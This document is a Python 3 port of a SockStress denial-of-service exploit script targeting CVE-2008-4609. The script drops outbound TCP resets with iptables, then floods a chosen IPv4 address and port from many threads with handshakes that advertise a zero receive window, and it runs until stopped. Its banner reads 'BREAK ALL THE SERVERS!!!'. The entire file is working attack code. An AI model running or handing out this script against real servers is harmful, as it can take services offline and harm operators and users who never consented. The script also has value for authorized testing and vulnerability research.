#!/usr/bin/env python3

"""
 Exploit Title: SockStress DoS
 Date: July 4, 2014
 Exploit Author: Justin Hutchens 
 LinkedIn: www.linkedin.com/in/justinhutchens
 Twitter: @pan0pt1c0n
 Tested on: Kali Linux x64
 CVE: CVE-2008-4609

 Python 3 port: January 2025 by movatica
"""

import argparse
from ipaddress import IPv4Address
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from time import sleep
from _thread import start_new_thread
import os
from random import randint
import signal
import sys

from scapy.error import Scapy_Exception
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send, sr1


def commandline() -> argparse.Namespace:
    """ Commandline arguments """
    parser = argparse.ArgumentParser(
            description='TCP sockstress implementation for CVE-2008-4609.')
    parser.add_argument('target', type=IPv4Address,
                        help='target ipv4 address.')
    parser.add_argument('port', type=int,
                        help='target Port - must be reachable!')
    parser.add_argument('-t', '--threads', type=int, default=20,
                        help='number of threads to run in parallel (default: 20)')
    return parser.parse_args()


def sockstress(dstaddr: IPv4Address, dstport: int) -> None:
    """ Send SYN-ACK sequence with zero window. """
    dstaddr = str(dstaddr)

    while True:
        try:
            srcport = randint(0,65535)
            response = sr1(
                    IP(dst=dstaddr) / TCP(sport=srcport,dport=dstport,flags='S'),
                    timeout=1,
                    verbose=0)
            send(
                    IP(dst=dstaddr) / TCP(sport=srcport,dport=dstport,flags='A',ack=response[TCP].seq+1,window=0) / '\x00\x00',
                    verbose=0
                    )
        except Scapy_Exception:
            pass


## Graceful shutdown allows IP Table Repair
def graceful_shutdown(*_):
    print('\nYou pressed Ctrl+C!')
    print('Fixing IP Tables')
    os.system(f'iptables -D OUTPUT -p tcp --tcp-flags RST RST -d {options.target} -j DROP')
    sys.exit()


print("\n*******************************************************")
print("**  Python Sock Stress DoS                           **")
print("**  by Pan0pt1c0n (Justin Hutchens)                 **")
print("**  BREAK ALL THE SERVERS!!!                         **")
print("*******************************************************\n\n")

options = commandline()

## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
os.system(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {options.target} -j DROP')
signal.signal(signal.SIGINT, graceful_shutdown)
signal.signal(signal.SIGTERM, graceful_shutdown)

## Spin up multiple threads to launch the attack
print("The onslaught has begun...use Ctrl+C to stop the attack")
for _ in range(options.threads):
    start_new_thread(sockstress, (options.target, options.port))

## Make it go FOREVER (...or at least until Ctrl+C)
while True:
    sleep(1)
